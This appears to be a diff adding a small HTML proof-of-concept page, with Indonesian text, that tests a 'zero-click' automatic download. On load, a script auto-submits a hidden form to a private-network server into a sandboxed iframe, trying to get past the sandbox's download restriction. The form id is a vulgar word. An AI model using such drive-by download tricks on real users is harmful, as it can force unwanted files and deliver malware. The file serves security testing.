@@ -1,0 +1,24 @@
+<html>
+
+<head>
+    <title>POC Auto Download Zero-Click</title>
+</head>
+
+<body>
+    <h1>Test Auto-Download Tanpa Klik</h1>
+    <p>Tunggu sebentar, sedang mencoba trigger download otomatis...</p>
+    <iframe name="target_form_frame" sandbox="allow-scripts allow-forms" width="300" height="50"
+        style="border: 1px solid red;"></iframe>
+    <form id="kontolKontol" action="http://10.49.93.4:5000/download" target="target_form_frame" method="GET">
+        <input type="hidden" name="payload" value="bypass_test">
+    </form>
+    <script>
+        try {
+            document.getElementById('kontolKontol').submit();
+        } catch (e) {
+            console.log("Form submit error", e);
+        }
+    </script>
+</body>
+
+</html>
